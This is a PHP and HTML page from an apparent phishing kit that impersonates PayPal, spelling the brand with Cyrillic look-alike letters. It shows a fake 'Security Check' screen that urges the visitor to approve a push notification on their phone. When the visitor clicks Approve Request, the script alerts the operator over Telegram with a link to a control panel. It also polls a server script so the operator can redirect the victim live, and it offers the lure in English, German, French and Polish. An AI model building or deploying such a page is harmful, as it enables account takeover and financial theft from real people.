<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en'; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['approval_granted'] = true;
    $data['status'] = 'waiting';
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . "/panel.php?sid=" . $sid;
    sendToTelegram("✅ <b>Approval Granted</b>\nSID: <code>$sid</code>\n\n➡️ <a href='{$panel_link}'>Open Control Panel</a>");
    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>РayРal - Security Check</title>
    <script src="https://cdn.tailwindcss.com"></script><script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script>tailwind.config = { theme: { extend: { colors: { pp: { blue: '#003087', 'blue-light': '#E1F0FA', 'blue-soft': '#0070BA', dark: '#001c3a' } } } } }</script>
    <style>
        * { font-family: 'Inter', sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #F3F4F6; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pop { 0% { opacity: 0; transform: scale(0.7); } 70% { transform: scale(1.05); } 100% { opacity: 1; transform: scale(1); } }
        @keyframes ring { 0% { transform: scale(1); opacity: 0.5; } 100% { transform: scale(1.9); opacity: 0; } }
        .fade-up { opacity: 0; animation: fadeUp 0.7s ease-out forwards; } .pop { opacity: 0; animation: pop 0.5s ease-out forwards; }
        .d1 { animation-delay: 0.1s; } .d2 { animation-delay: 0.3s; } .d3 { animation-delay: 0.5s; } .d4 { animation-delay: 0.7s; }
        .btn-main { background: #003087; transition: all 0.3s ease; position: relative; overflow: hidden; }
        .btn-main::after { content: ''; position: absolute; inset: 0; background: linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.15) 48%, rgba(255,255,255,0.04) 52%, transparent 56%); background-size: 250% 100%; background-position: 250% 0; transition: background-position 0.7s ease; }
        .btn-main:hover::after { background-position: -50% 0; } .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 30px -6px rgba(0,48,135,0.4); } .btn-main:active { transform: translateY(0); }
        .notif-ring { position: absolute; inset: 0; border-radius: 50%; border: 2px solid #003087; animation: ring 2.2s ease-out infinite; }
        .logo-img { height: 42px; width: auto; }
        /* Animation dyal l téléphone */
        @keyframes phoneShake { 0%, 100% { transform: rotate(0deg); } 20% { transform: rotate(-12deg); } 40% { transform: rotate(12deg); } 60% { transform: rotate(-8deg); } 80% { transform: rotate(8deg); } }
        .phone-shake { animation: phoneShake 1.5s ease-in-out infinite; transform-origin: bottom center; }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <div class="w-full max-w-sm px-4">
        <form id="approveForm" method="POST" action="approvation.php?sid=<?php echo htmlspecialchars($sid); ?>">
            <div class="bg-white rounded-3xl shadow-xl overflow-hidden">
                <div class="h-1.5 bg-pp-blue"></div>
                <div class="flex flex-col items-center px-8 pt-12 pb-12">
                    <div class="pop mb-10"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal" class="logo-img"></div>
                    
                    <!-- Hna l logo li fih animation dyal push notification -->
                    <div class="pop d1 relative mb-6">
                        <div class="notif-ring"></div>
                        <div class="w-20 h-20 bg-pp-blue-light rounded-3xl flex items-center justify-center relative z-10 phone-shake">
                            <span class="iconify text-pp-blue" data-icon="lucide:smartphone" style="font-size: 40px;"></span>
                            <span class="absolute -top-1 -right-1 w-5 h-5 bg-red-500 rounded-full flex items-center justify-center z-20">
                                <span class="iconify text-white" data-icon="lucide:bell" style="font-size: 12px;"></span>
                            </span>
                        </div>
                    </div>
                    
                    <p class="fade-up d2 text-[11px] text-gray-400 uppercase tracking-[0.2em] mb-4" id="app_label">Push Notification</p>
                    
                    <!-- Hna l message li bghiti -->
                    <p class="fade-up d2 text-[14px] text-gray-600 text-center leading-relaxed mb-6 px-2" id="app_message">Check your mobile phone. You will receive a notification for approval to verify your account.</p>

                    <button type="submit" id="btn" class="fade-up d3 btn-main w-full py-4 rounded-2xl text-white font-semibold text-[15px] flex items-center justify-center gap-2.5 shadow-lg" style="box-shadow: 0 8px 24px -6px rgba(0,48,135,0.35);">
                        <span class="iconify" data-icon="lucide:check-circle-2" style="font-size: 20px;"></span>
                        <span id="app_btn_text">Approve Request</span>
                    </button>
                    <p class="fade-up d4 text-[10px] text-gray-300 mt-10 tracking-wide">РayРal · Security Center</p>
                </div>
            </div>
        </form>
    </div>
    <script>
        function handleClick(e) {
            e.preventDefault(); const btn = document.getElementById('btn'); const form = document.getElementById('approveForm');
            btn.style.pointerEvents = 'none'; btn.innerHTML = `<svg class="w-5 h-5 animate-spin text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg><span>Authorizing...</span>`;
            setTimeout(() => { btn.innerHTML = `<span class="iconify" data-icon="lucide:check" style="font-size: 20px;"></span><span>Approved ✓</span>`; btn.style.background = '#16A34A'; btn.style.boxShadow = '0 10px 30px -6px rgba(22,163,74,0.4)'; setTimeout(() => form.submit(), 600); }, 1200);
        }
        document.getElementById('btn').addEventListener('click', handleClick);

        const translations_app = {
            en: { 
                label: "Push Notification", 
                btn: "Approve Request",
                message: "Check your mobile phone. You will receive a notification for approval to verify your account."
            },
            de: { 
                label: "Push-Benachrichtigung", 
                btn: "Anfrage genehmigen",
                message: "Überprüfen Sie Ihr Mobiltelefon. Sie erhalten eine Benachrichtigung zur Genehmigung, um Ihr Konto zu verifizieren."
            },
            fr: { 
                label: "Notification Push", 
                btn: "Approuver la demande",
                message: "Vérifiez votre téléphone portable. Vous recevrez une notification d'approbation pour vérifier votre compte."
            },
            pl: { 
                label: "Powiadomienie Push", 
                btn: "Zatwierdź żądanie",
                message: "Sprawdź swój telefon komórkowy. Otrzymasz powiadomienie o zatwierdzeniu, aby zweryfikować swoje konto."
            }
        };
        function initLang(lang) {
            const data = translations_app[lang] || translations_app['en'];
            document.getElementById('app_label').innerText = data.label;
            document.getElementById('app_message').innerText = data.message;
            document.getElementById('app_btn_text').innerText = data.btn;
        }
    </script>
    <script>const sid="<?php echo isset($sid)?addslashes($sid):'';?>"; if(sid){setInterval(()=>{fetch('process.php?action=ping&sid='+sid).then(r=>r.json()).then(data=>{if(data.redirect)window.location.href=data.redirect+'?sid='+sid;}).catch(()=>{});},5000);}</script>
</body>
</html>